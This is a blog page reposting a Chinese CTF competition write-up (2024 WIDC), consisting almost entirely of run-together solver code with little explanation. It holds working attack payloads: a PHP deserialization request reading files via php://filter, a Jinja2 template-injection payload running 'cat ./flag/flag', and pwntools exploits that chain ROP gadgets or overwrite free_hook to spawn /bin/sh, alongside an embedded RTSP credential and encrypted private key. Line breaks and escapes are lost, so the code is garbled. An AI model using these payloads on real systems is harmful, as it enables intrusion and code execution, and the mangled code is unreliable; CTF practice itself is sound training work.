+>>> original_hex = 0x3836353635367830>>> original_hex.to_bytes(32, byteorder = 'big')b'x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00865656x0'>>> original_hex.to_bytes(32, byteorder = 'big').hex()'0000000000000000000000000000000000000000000000003836353635367830'
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">rtsp://ubnt:</span><br><span class="line">wbox123@172.10.0.12:</span><br><span class="line">8554/live</span><br><span class="line">import pynmea2import foliumimport os</span><br><span class="line">def parse_file(file_path):# 定义一个数据预处理的函数 txt_tables = [] f = open(file_path, &quot;r&quot;,encoding=&#x27;utf-8&#x27;) line = f.readline() # 读取第一行 locations = [] while line: text = line[0:]# 从$GPGGA开始读 msg = pynmea2.parse(text) # print(msg.latitude) #24.551053333333332 # print(msg.longitude) #118.1067375 tmp = [] if(msg.latitude == 0.0 or msg.longitude == 0.0): line = f.readline() # 读取下一行 continue tmp.append(msg.latitude) tmp.append(msg.longitude) locations.append(tmp) line = f.readline() # 读取下一行 return locationslocations=parse_file(&quot;./a.dat&quot;)def draw_gps(locations, output_path, file_name): m = folium.Map(locations[0], zoom_start=15, attr=&#x27;default&#x27;) #中心区域的确定 folium.PolyLine( # polyline方法为将坐标用线段形式连接起来 locations, # 将坐标点连接起来 weight=3, # 线的大小为3 color=&#x27;orange&#x27;, # 线的颜色为橙色 opacity=0.8 # 线的透明度 ).add_to(m) # 将这条线添加到刚才的区域m内 # 起始点，结束点 folium.Marker(locations[0], popup=&#x27;Starting Point&#x27;).add_to(m) folium.Marker(locations[-1], popup=&#x27;End Point&#x27;).add_to(m) m.save(os.path.join(output_path, file_name)) # 将结果以HTML形式保存到指定路径draw_gps(locations,&quot;./&quot;,&quot;index.html&quot;)#调用</span><br><span class="line">file://$PROJECT_DIR$/src/PPlab.phpfile://$PROJECT_DIR$/src/index.phpfile://$PROJECT_DIR$/src/trueflag.php</span><br><span class="line">&lt;?php</span><br><span class="line">class show &#123; public $filename; function printContent() &#123; $content = file_get_contents($this-&gt;filename); echo $content; &#125;&#125;</span><br><span class="line">$a = new show();$a-&gt;filename = &quot;php://filter/read=convert.base64-encode/resource=trueflag.php&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">-----------------</span><br><span class="line">POST /PPlab.php HTTP/1.1Host: 172.10.0.17:</span><br><span class="line">1221Upgrade-Insecure-Requests: 1User-Agent:</span><br><span class="line">ChromeAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9X-Forwarded-For: 127.0.0.1Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 104</span><br><span class="line">show=O:4:&quot;show&quot;:1:&#123;s:8:&quot;filename&quot;;s:61:&quot;php://filter/read=convert.base64-encode/resource=trueflag.php&quot;;&#125;</span><br><span class="line">user=&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat ./flag/flag&#x27;).read() &#125;&#125;&amp;pwd=testyjyj</span><br><span class="line">gs -o xx.pdf -sDEVICE=pdfwrite xx.pjl</span><br><span class="line">from pwn import *context.log_level=&#x27;debug&#x27;context.binary=ELF(&#x27;./server&#x27;)elf=ELF(&#x27;./server&#x27;)libc=ELF(&#x27;./libc-2.31.so&#x27;)SOCKFD = 4</span><br><span class="line">def get(payload): global p p = remote(&#x27;172.10.0.16&#x27;, 9080) py=flat(&#123; 0:b&#x27;GET /&#x27;, 255: b&#x27;r&#x27;, 0x138:[ payload ], &#125;,filler=b&#x27;x00&#x27;) p.send(py+b&#x27;rn&#x27;)rop=ROP(elf)rop.http_response(4,elf.got[&#x27;write&#x27;])get(rop.chain())p.recvuntil(b&#x27;&lt;/html&gt;nHTTP/1.1&#x27;)libcbase=u64(p.recvline().strip().ljust(8,b&#x27;x00&#x27;))- libc.symbols[&#x27;write&#x27;]success(hex(libcbase))libc.address=libcbaserop = ROP(libc)rop.dup2(SOCKFD, 0)rop.dup2(SOCKFD, 1)rop.dup2(SOCKFD, 2)rop.system(next(libc.search(b&#x27;/bin/sh&#x27;)))get(rop.chain())p.recvuntil(b&#x27;&lt;/html&gt;n&#x27;)p.interactive()</span><br><span class="line">密文：pbiTIScexzkjzu7byRie4gAyVnzDIlWXdmrm32JX4k9OPzh91SRuzgtgBjN2zbAzYmiP1/Mi0Iplb8vUEC8urUpKk1NOR12fliP/elZ2nXk=key:</span><br><span class="line">esa7esa7esa7esa7模式：AES/ECB/ZeroBytePadding</span><br><span class="line">charon@root:~/Desktop/tools/pycdc$ ./pycdc 1.pyc</span><br><span class="line"># Source Generated with Decompyle++# File: 1.pyc (Python 3.8)</span><br><span class="line">from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modesfrom cryptography.hazmat.primitives import paddingfrom cryptography.hazmat.backends import default_backendimport base64</span><br><span class="line">def encrypt(plaintext, key, iv): cipher = Cipher(algorithms.AES(key), modes.CBC(iv), default_backend(), **(&#x27;backend&#x27;,)) padder = padding.PKCS7(128).padder() padded_plaintext = padder.update(plaintext) + padder.finalize() encryptor = cipher.encryptor() ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize() return base64.b64encode(ciphertext).decode()</span><br><span class="line">plaintext = &#x27;flag&#x27;ciphertext = &#x27;XalqLcjPTIHqHSnybH24Vy5BfobRchwUlKZpkfOmBoniTrW7dKgdgKg3npyW0ENJgkVlbHjKDTvj0UfSX6agvAGFVlgNV/HE2BS0ELZIM+xE3lU5LNDehjjKeW+ZhZuZjEohAqCJBsHX2zKMrtLlIQ==&#x27;key = b&#x27;asfdsf141fsad11f&#x27;iv = b&#x27;MDEyMzQ1Njc4OWFi&#x27;ciphertext = encrypt(plaintext.encode(), key, iv)print(&#x27;密文:&#x27;, ciphertext)</span><br><span class="line"># sagefrom Crypto.Util.number import *def GaussLatticeReduction(v1, v2): while True: if v2.norm() &lt; v1.norm(): v1, v2 = v2, v1 m = round( v1v2 / v1.norm()^2 ) if m == 0: return (v1, v2)* v2 = v2 - m*v1</span><br><span class="line">p = 31133702248881127631782881523509514476295949917122267121183371475000133184586174714396793644108294610935657329746903823657946536256899714076625760275173956706353888064555549064829709009640322743264038620966294636309911212621150898337629208482500384052935025619985047550270255090023343971256783414328092914248587672386617566422965425207785676797600936839556684715022346892107346366574407526099471338642307133437759220537846448437788211849588664491112404963383693116467782205041029098512207782583480993966604998421344660336431260561583879139849901548024253578304205860692342713953570388722937954933289936897205980716117h = 7479856923878243888440888672844723062047571272556529760791388804749830947638106557467887553359594527284215983651237303197361839342245930727075103851252694200077479188468017448449313614412769738144700971711549137789290733004590838892989968103378686521773849802601405707815668581933555308957750986742176692804532749076668670300598708809281336336814136161669355533687195881130337149759522328766625901698480300656083599150462729901168306146171589266181628852056728470683680551973098848836293771016415271912573220080593590309888271888517605697277144430578513191280950815089968643259211353244436267567557456053045262878466c = 429633025508597849623581682941413262998122137449005442145138470065847327103036727404626306379284511549714302199598866480970675273975210441015457022843111558443561825331941415126255871526201864795940071437602555024286559341823246182157480790439813986927891748029716157798569943993538191841077926115352987414280071817801043098050542082078666616788674806002113613279589438740909428444797915581688744647694596536620226032782501572321014769949362774191243994608572057792056353664666429685043726397327996076875440373242053749476708726634285972033216701275507339428064215442465140310384610569381749508378023099179079407328</span><br><span class="line"># Construct lattice.v1 = vector(ZZ, [1, h])v2 = vector(ZZ, [0, p])m = matrix([v1,v2]);</span><br><span class="line"># Solve SVP.shortest_vector = m.LLL()[0]# shortest_vector = GaussLatticeReduction(v1, v2)[0]f, g = abs(shortest_vector[0]),abs(shortest_vector[1])print(f, g)</span><br><span class="line"># Decrypt.a = f*c % p % gm = a * inverse_mod(f, g) % gprint(&#x27;m=&#x27;,m)print(long_to_bytes(int(m)))</span><br><span class="line"></span><br><span class="line">----</span><br><span class="line">104487247500523630173466372012725893519340931300717034092093816350849886822853396168341013290959218180002031254321615523603199349964982692123231600651096747843269073795060299161138930217923899257522072771491233070803811809812208840371872635298833148136787331270890661224119684926154327930512610649281320612648 124543096895293893329367669185601759252473199871894159618224942112012325224062867378866918876501559305963983337570110136768019392332660013395569122436762967931653460895335031144428244801453964870767329929024450393254183082388201674464525220841626637783670034040457808515142474641802222980794941462034685363019m= 67557894833899879721535443738683635889742076553897445643184762026832680586233392404925048827896424102785684459189389647962484b&#x27;f2jmf5ld0akrqhxmd7ig3ad22b0eda76e391RQ9tZMH5CBjPthat&#x27;</span><br><span class="line">jm0g3&#123;djyalj&#123;4og3k1vequwbi:</span><br><span class="line">f61:6f;36:;2dkkfAWRjSv2UFDukk</span><br><span class="line">bool __fastcall Java_com_ctf_read_MainActivity_getFlag(__int64 a1, __int64 a2, __int64 a3)&#123; const char *v3; // x19 size_t v4; // w20 const char *v5; // x0 __int64 v6; // x8 __int64 v7; // x9 unsigned __int8 *v8; // x11 _BYTE *v9; // x12 __int64 v10; // x17 int v11; // w2 int v12; // w1 int v13; // t1 _BOOL4 v14; // w4 unsigned int v15; // w7 _BOOL4 v16; // w20 _BOOL4 v17; // w10 _BOOL4 v18; // w27 unsigned int v19; // w5 unsigned int v20; // w6 int v21; // w4 char v22; // w10 __int64 v24; // x8 char *v25; // x10 const char *v26; // x9 unsigned int v27; // w15 __int64 v28; // [xsp+8h] [xbp-8h]</span><br><span class="line"> v3 = (const char *)_JString2CStr(a1, a3); v4 = strlen(v3); v5 = (const char *)malloc(v4 + 1); v5[v4] = 0; if ( (int)v4 &lt; 1 ) return strcmp(v5, buff) == 0; v6 = v4; if ( v4 &lt; 2uLL ) &#123; v7 = 0LL;LABEL_22: v24 = v6 - v7; v25 = (char *)&amp;v5[v7]; v26 = &amp;v3[v7]; do &#123; v27 = *(unsigned __int8 *)v26; if ( v27 - 48 &lt;= 9 ) &#123; v27 = ((unsigned __int8)(v27 - 45) % 0xAu) | 0x30; &#125; else if ( v27 - 97 &gt; 25 ) &#123; if ( v27 - 65 &lt;= 25 ) v27 = (unsigned __int8)(v27 - 62) % 0x1Au + 65; &#125; else &#123; v27 = (unsigned __int8)(v27 - 94) % 0x1Au + 97; &#125; --v24; ++v26; *v25++ = v27 ^ 3; &#125; while ( v24 ); return strcmp(v5, buff) == 0; &#125; v8 = (unsigned __int8 *)(v3 + 1); v9 = v5 + 1; v28 = v4 &amp; 1; v7 = v4 - v28; v10 = v7; do &#123; v11 = *(v8 - 1); v13 = *v8; v8 += 2; v12 = v13; v14 = (unsigned __int8)(v13 - 58) &lt; 246u; // &gt;0x39 or &lt; 0x30 v15 = v11 - 65; v16 = (unsigned __int8)(v13 - 123) &lt; 230u; v17 = (unsigned int)(v13 - 65) &gt; 0x19; v18 = (unsigned int)(v13 - 65) &lt; 26; v19 = ((unsigned __int8)(v13 - 45) % 0xAu) | 0x30; if ( (unsigned int)(v11 - 97) &gt;= 26 ) // &lt;97 v20 = ((unsigned __int8)(v11 - 45) % 0xAu) | 0x30; else v20 = (unsigned __int8)(v11 - 94) % 26u + 97; v21 = v14 &amp;&amp; v16; if ( (unsigned int)(v12 - 97) &lt; 26 ) // 97 &lt;= x &lt;= 122 v19 = (unsigned __int8)(v12 - 94) % 26u + 97; if ( (unsigned __int8)(v11 - 58) &lt; 246u &amp;&amp; (unsigned __int8)(v11 - 123) &lt; 230u &amp;&amp; v15 &lt; 0x1A ) v20 = (unsigned __int8)(v11 - 62) % 26u + 65; if ( (v21 &amp; v18) != 0 ) v19 = (unsigned __int8)(v12 - 62) % 26u + 65; if ( (unsigned __int8)(v11 - 58) &gt;= 246u || (unsigned __int8)(v11 - 123) &gt;= 230u || v15 &lt;= 0x19 ) LOBYTE(v11) = v20; if ( (v21 &amp; v17) != 0 ) v22 = v12; else v22 = v19; v10 -= 2LL; *(v9 - 1) = v11 ^ 3; *v9 = v22 ^ 3; v9 += 2; &#125; while ( v10 ); if ( v28 ) goto LABEL_22; return strcmp(v5, buff) == 0;&#125;</span><br><span class="line">    #include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123; // if ( (unsigned __int8)(47 - 123) &lt; 230 )// printf(&quot;33333n&quot;); char enc[] = &quot;jm0g3&#123;djyalj&#123;4og3k1vequwbi:</span><br><span class="line">f61:6f;36:;2dkkfAWRjSv2UFDukk&quot;;</span><br><span class="line"> for(int i = 0; i &lt; 56; i++) &#123; for(int j = 0; j &lt; 0x7f; j++) &#123; unsigned char tmp = j; if(j &gt;= 0x30 &amp;&amp; j &lt;= 0x39) tmp = ((unsigned __int8)(j - 45) % 0xA) | 0x30; if(j &gt;= &#x27;A&#x27; &amp;&amp; j &lt;= &#x27;Z&#x27;) tmp = (unsigned __int8)(j - 62) % 26 + 65; if(j &gt;= &#x27;a&#x27; &amp;&amp; j &lt;= &#x27;z&#x27;) tmp = (unsigned __int8)(j - 94) % 26 + 97; tmp ^= 3; if(tmp == enc[i]) &#123; putchar(j); break; &#125; &#125; &#125;</span><br><span class="line"> return 0;&#125;</span><br><span class="line">Exp:#coding=utf8</span><br><span class="line">from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;bash&#x27;,&#x27;-c&#x27;]local = 0binary_name = &#x27;pwn&#x27;if local: cn = process(&#x27;./&#x27;+binary_name)else: cn = remote(&#x27;172.10.0.19&#x27;,8888)ru = lambda x : cn.recvuntil(x)sn = lambda x : cn.send(x)rl = lambda : cn.recvline()sl = lambda x : cn.sendline(x)rv = lambda x : cn.recv(x)sa = lambda a,b : cn.sendafter(a,b)sla = lambda a,b : cn.sendlineafter(a,b)bin = ELF(&#x27;./&#x27;+binary_name,checksec=False)def z(a=&#x27;&#x27;): if local: gdb.attach(cn,a) if a == &#x27;&#x27;: raw_input() else: passpush = 0x2A3Dpop = 0xFFFF28add = 0x0sub = 0x11111mul = 0xABCEFdiv = 0x514load = -1save = 0x10101010system_addr = 0x8051c60free_hook = 0x80e09f0</span><br><span class="line">def create(d): return &quot; &quot;.join([str(x) for x in d])heap_offset = (0x110-8) // 4code = create([push,push,push,push,load,push,sub,div,save])data = create([&quot;/bin/sh&quot;,system_addr,4,heap_offset,free_hook])cn.sendline(code)cn.sendline(data)cn.interactive()</span><br><span class="line">私钥：-----BEGIN ENCRYPTED PRIVATE KEY-----MIIFLTBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQIfp6g2gKBuQICAggAMAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBCRTqP45fvUX+BFO9Iq8W/7BIIE0Nfc4n4SbblrA52ukXCOPIZqDSwGgBcAlxjkRJc06Y3kaNMoz4DoOt1hL6GT1d6Th/nfGOEJKJyIz1qfwXiIyKuSGPXmTIukuHZC79jmgUVDd/Tiyg4h4WxJRnAHIeq66M/WLRWbxNqbzMWJ/aU8Vyk/bEgC62I[表情]xE4CUrLjq5mDgF0Mt9J2GBdMBtxONyCtMB4h+m1ik6/hIiBX+MsgUp6PMTYFpK2txbjR0BzR0zXIFuoK2BfDQKKkoJK3+L+6D2Pu69pc4/OmvrULNqNa9XJD1y7ptCAHaHwl/459CnCNoxf5d1GA5RvozHw4Tt6xPz8WQ2vMEucSYCqu4HeW7QBGdzH65IcdpWzDLtsssuSjeROljJL5UplEWwmjL+9y98I42MTFQa4Bhx+MqGEBu8ZMDAePfojwhy1cuhjq2/YcffpWncQnKz96RhIDpLA5SjPwZ7sD5pu0W59ZjtjxVZqqiGW7qph4tg9md8s/oDUjAs+84Wt8171X2GUsI2aiCA7PDzygr+9cmOusNfA+FR4kdC5vuzen0LcqiKHd8btFFeuHF7PGY5pODybGieFRMdK9K1KMMOFp+H5lXXOf5AGJVAvjsgvHKYuGAyfEMtq8KB1BjaOvwaaYY2l6s6E8M1wTt0sjcFaWhxm0sno2/ICmxOOMqm1vY6TRswM0kunSwSXRmaiWcvjyzIBsCRORjbL4qi/NaBfgxaAYZxljcfBNsJz4rvhD3HOm6gai5SNxKj8LFmOuZbJn7WsdbqastuH5lnsjAqqLxqf1N3p3M4qa2b1YimtA9lgBcs2GvChGIr9B6QKJGQdscjfwlDDiIEoHcsMdyhrUPGM024ff+5M+yfhkPRYoOialVp36yBpnGTXMv/FcVc16DBoSxYTmc8hpe68soAOwU2SL2U6VKilO81B2LuVU8EpF56xbfx0oV0Yp+aAYQaOE99WUqRD3f+y2fQbFzrxjD8zwK6gQCR/HV1FUNenyFNmAxNv7k1q9PSj+vDEgGk9b1YG+SfhyXzbsRNR6pPxN75eX/Lohf+fAlb+kOardIjAADFd0575VjoXsklxsYnHY0nrwCZl2url6+qAvfRNcQ+gDa9o83X+k/i1Q8M719KrL7XvhOuks226MFVTnACwFC+ACZVdiW73ab442EhYn4EgVNxIkSxmgonfgqQepftoCtK/ezKpR2+W630CqEl8BGi7s36V6cgBB7dcBLbvi2CGh2nCC0rWmPOOcpryrBxJf1VUhcWsemsHvSG0bIylqMV/POYFSzVVtpaO5kZu5JZbfPNt1FzKSBeSSDwUjUcDrhd+x1u26gVDDiCa2UGRzdu4OQCcOOgkkaQ8QQTPX75BiCMdu+BkhFBlMbPnatxCRsSHKTiHibwOydB7pwnC+ojtiNKwYypJnkuchPD0Ef3oUbiFVgFHnMwn6ivUp4WcspoluNAs6kqobxzKlfdTRJBd/8RJIdmm1MJkIjVHX+E+76B0Y1Rf4q1OJ/SSzHGt0YYXQXliPkWNze6JRA6Ko58t3lAV9JHcAlURkXTDxdSg1BR1zFwqUGLT6HUXBFcpsD/FTh1VX7cFMH/RZcnwIZcPen6orGl5IV4U42D0VoVPNYFUtRNyl2fHtqEIlC4NbA6xUFG-----END ENCRYPTED PRIVATE KEY-----flag:</span><br><span class="line">R0CHlZ3TTo8Uj8oymgTGGsG/okvPHP3n/v0CKOE4g0uDqEd4snXAq/kxxUSfEQh8xrGtN6XZB5gJpj+p/96cbECoBoVuhqRO9BxmH63X7cHtv6R3181b0aXuQvSF5uQ1DLgl+nIgKcrhromVryYZYtNWU5Y3BkejWtUL+2tfBRyvB1fGPNZB7OmCALFXpVtb0e5I7x+PlGuPCn1KCCnSS3WwwOLMz6Ftk8p2rEevlmAeMGE3UzjgZO3QVg92X1bXKW0cN+LCOgwkwAx2LJWiHZXzN6dpSoFJ2DETnsQ5BUkQGzkxNQBH6ycelFO/Lx5iHnSBb7bI4dCooGaX0qXx0w==</span><br><span class="line">cipflag:b&#x27;xebxb1J:&#125;xb6xadSx89x86xabxe7x9bsxd5xebyxf2xdexd2nxf9xa3xa8Gkxb2$BEx03x9fxa1xf7xa9x19x85Sxa8Yxe2Vx98x8dx1eux84xbd`-xcaxd4xc3Em\xd1xa1xf7i6xcbx0cx842txccx94xe6x94xeeAxb4Hxd32hxf5x13K&#x27;randomiv:b&#x27;xddx92xd2x1axb8xe2&lt;Hxb7xfaNx94xc8x1a$xb3&#x27;</span><br><span class="line">&gt;&gt;&gt; original_hex = 0x3836353635367830&gt;&gt;&gt; original_hex.to_bytes(32, byteorder = &#x27;big&#x27;)b&#x27;x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00865656x0&#x27;&gt;&gt;&gt; original_hex.to_bytes(32, byteorder = &#x27;big&#x27;).hex()&#x27;0000000000000000000000000000000000000000000000003836353635367830&#x27;</span><br></pre></td></tr></table></figure>
+
+
+---
+## 附图
+
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+
+---
+
+> **转载声明**：本文转载自 [Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。
+> 原文链接：[https://www.ctfiot.com/183712.html](https://www.ctfiot.com/183712.html)
+> 仓库原文：[CTF大赛WP集合/articles/2024_WIDC_writeup_by_Arr3stY0u.full.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/2024_WIDC_writeup_by_Arr3stY0u.full.md)
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/RTSP/">RTSP</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/01/ctf-kb/wp/Misc/2024-CISCN-%E9%95%BF%E5%9F%8E%E6%9D%AF-%E5%A8%81%E8%83%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90WP/" title="2024 CISCN x 长城杯 威胁检测与流量分析 WP（zeroshell + WinFT）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2024 CISCN x 长城杯 威胁检测与流量分析 WP（zeroshell + WinFT）</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/01/ctf-kb/wp/Misc/2024_%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B_-%E9%87%91%E7%9B%BE%E6%A3%80%E6%B5%8B/" title="2024 能源网络安全大赛预赛【金盾检测】"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2024 能源网络安全大赛预赛【金盾检测】</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
